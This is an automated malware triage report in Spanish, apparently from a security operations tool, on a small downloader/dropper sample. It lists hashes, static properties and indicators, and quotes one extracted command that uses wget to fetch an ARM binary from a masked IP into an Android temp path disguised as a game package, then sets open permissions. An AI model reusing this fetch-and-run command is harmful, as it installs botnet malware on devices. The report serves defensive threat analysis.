# 🧬 Payload Analysis

`81022b4f657a7bbeb6cb5c20750d54b8fe042b718785a1a127dc9d24b6ca2b75`

## 📌 Resumen

Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Cambio de permisos. Se asoció 1 comando observado o extraído.

## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:52:40+00:00`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `81022b4f657a7bbeb6cb5c20750d54b8fe042b718785a1a127dc9d24b6ca2b75`
- **SHA1:** `cb08114fd13fef69db6e4158bf7a7cb90f4fa34c`
- **MD5:** `1189181280d434d2e9729102101b8dd0`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | data |
| Tamaño | 207 B |
| Entropía | 4.71 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Cambio de permisos**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=data; iocs=4

## 🖥️ Comandos observados / extraídos

```text
shell:toybox wget hxxp://94.154.43.XXX/rebirth.arm7 -O /data/local/tmp/com.supercell.clashroyal; chmod 777 /data/local/tm
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 94.154.43.XXX | static_analysis |
| url | hxxp://94.154.43.XXX/rebirth.arm7 | strings |
| hash | 81022b4f657a7bbeb6cb5c20750d54b8fe042b718785a1a127dc9d24b6ca2b75 | static_analysis |
| command | shell:toybox wget hxxp://94.154.43.XXX/rebirth.arm7 -O /data/local/tmp/com.supercell.clashroyal; chmod 777 /data/local/tm | strings |
| ip | 46.151.178.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | structured text |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
